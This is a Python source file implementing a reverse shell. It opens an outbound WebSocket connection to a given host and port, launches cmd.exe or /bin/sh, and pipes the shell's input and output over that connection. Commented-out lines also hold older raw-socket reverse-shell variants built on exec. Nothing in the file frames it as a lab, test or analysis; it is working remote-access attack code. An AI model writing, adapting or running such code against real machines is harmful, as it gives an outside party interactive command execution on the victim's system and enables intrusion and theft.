import asyncio
import platform
import socket
import subprocess
import websockets

async def __s(p, s, ws=False):
    while True:
        output = await asyncio.to_thread(p.stdout.readline)
        if output == '' and p.poll() is not None:
            break
        if output:
            await s.send(output)  # Send process output to WebSocket

async def __r(p, s, ws=False):
    async for message in s:
        await asyncio.to_thread(p.stdin.write, message)
        await asyncio.to_thread(p.stdin.flush)

async def createSession(host, port=80, ws=False, wss=False):
    if platform.system() == "Windows":
        bin = "cmd.exe"
    else:
        bin = "/bin/sh"

    if ws:
        print(f"[*] Connecting to {host}:{port} through WebSocket protocol")
        #asyncio.run(websocket_handler(f"{"wss" if wss else "ws"}://{host}:{port}", bin))
        s = await websockets.connect(f"{"wss" if wss else "ws"}://{host}:{port}")
    else:
        print("raw TCP socket is currently unsupported")
        return
        print(f"[*] Connecting to {host}:{port} through a raw TCP port")
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((host, port))
    p = subprocess.Popen([bin],stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE,text=True)
    a = asyncio.create_task(__s(p, s, ws))
    b = asyncio.create_task(__r(p, s, ws))
    return (a, b, p, s)
    #threading.Thread(target=__s, args=[p, s, ws]).start();
    #threading.Thread(target=__r, daemon=True, args=[p, s, ws]).start();
    #threading.Thread(target=exec,args=("while(True):o=os.read(p.stdout.fileno(),1024);s.send(o)",globals()),daemon=True).start()
    #threading.Thread(target=exec,args=("while(True):i=s.recv(1024);os.write(p.stdin.fileno(),i)",globals())).start()